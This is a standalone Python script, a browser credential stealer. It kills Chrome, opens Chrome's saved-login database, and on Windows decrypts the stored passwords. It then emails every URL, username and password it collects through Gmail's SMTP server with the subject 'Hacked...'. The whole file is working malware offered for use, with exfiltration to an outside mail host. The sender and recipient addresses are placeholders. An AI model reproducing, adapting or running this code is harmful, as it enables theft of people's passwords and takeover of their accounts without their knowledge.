#!/usr/bin/env python
import os
import sys
import sqlite3
import csv
import json
import argparse
import smtplib
import urllib
while(True):
   try:
        p=urllib.urlopen("http://www.google.com")
        break
   except:
       continue
try:
    import win32crypt
except:
    pass
try:
    os.system("taskkill /im chrome.exe /f")
except:
    pass
global PathName
if os.name == "nt":
        
        PathName = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
elif ((os.name == "posix") and (sys.platform == "darwin")):
        
        PathName = os.getenv(
            'HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
elif (os.name == "posix"):
        
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)


def mains():
    info_list = []
    path = PathName
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            print("Mac OSX not supported.")
            sys.exit(0)

        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })

            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
            sys.exit(0)
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
            sys.exit(0)
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
            sys.exit(0)
        else:
            print(e)
            sys.exit(0)

    return info_list


text=""


        
for data in mains():
            text=text+str(data)+"................"
conn=smtplib.SMTP('smtp.gmail.com',587)
conn.ehlo()
conn.starttls()
conn.login('your-email@gmail.com','your-password')
conn.sendmail('from-mail@gmail.com','to-mail@gmail.com','Subject: Hacked...\n\n'+text)
conn.quit()


